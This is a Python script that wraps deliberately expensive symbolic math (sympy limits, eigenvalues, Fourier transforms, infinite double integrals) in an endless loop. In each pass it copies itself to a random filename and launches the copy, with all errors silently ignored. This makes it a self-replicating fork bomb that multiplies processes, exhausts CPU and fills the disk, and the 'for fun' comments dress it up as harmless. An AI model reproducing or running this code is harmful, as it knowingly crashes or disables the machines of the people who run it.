import shutil
import subprocess
import random
try:
    subprocess.call(['pip', 'install', 'numpy', 'sympy', 'scipy'])
    import numpy as np
    from sympy import (symbols, Matrix, Function, I, sin, cos, exp, log, diff, integrate, limit, gamma, zeta, besselj, fourier_transform, Heaviside, DiracDelta, oo, sqrt, simplify)
    from sympy.abc import x, y, z, t, n
    from scipy.integrate import dblquad
    from numpy.fft import fftn, ifftn
except:
    exit()

while True:
    try:
        # Symbolic madness
        f = Function('f')(x)
        g = exp(I * x**2) * sin(x) * log(1 + x**2)

        # A complex limit of a derivative of an integral
        sym_expr = limit(
            diff(integrate(g / (1 + y**2), (y, 0, x)), x),
            x, 0
        )

        # A symbolic matrix filled with crazy expressions
        M = Matrix([
            [gamma(x + I), zeta(1 + x)],
            [besselj(n, x), exp(I * x**2)]
        ])

        # Symbolic eigenvalues
        eigen_vals = M.eigenvals()

        # Tensor creation with nested complex functions
        tensor = np.zeros((2, 2, 2), dtype=np.complex128)
        for i in range(2):
            for j in range(2):
                for k in range(2):
                    tensor[i, j, k] = complex(
                        np.sin(i + j + k) * np.exp(-(i**2 + j**2 + k**2)),
                        np.cos(i * j * k) * np.log1p(i + j + k)
                    )

        # N-dimensional Fourier transform and inverse
        fourier_data = fftn(tensor)
        reconstructed = ifftn(fourier_data)

        # Symbolic Fourier transform of a Dirac/Heaviside-mixed function
        ft_expr = fourier_transform(Heaviside(x) * exp(-x) + DiracDelta(x - 1), x, t)

        # Double numerical integral of a transcendental function over infinite domain
        dbl_integral_result = dblquad(
            lambda u, v: np.sin(u**2 + v**2) / (1 + u**2 + v**2),
            0, np.inf,
            lambda _: 0,
            lambda _: np.inf
        )

        # High-order symbolic derivative and integral with composite functions
        super_expr = integrate(
            diff(sin(x**2) * exp(x) / (1 + x**4), x, 5),
            (x, -1, 1)
        )

        # A mix of everything simplified just for fun
        final_combo = simplify(
            sym_expr +
            sum(eigen_vals.keys()) +
            ft_expr.subs(t, 1) +
            super_expr
        )
        file_name = random.randint(1001, 9999999)
        shutil.copyfile('1000.py', f"{file_name}.py")
        subprocess.call(['python3', f'{file_name}.py'])
    except:
        pass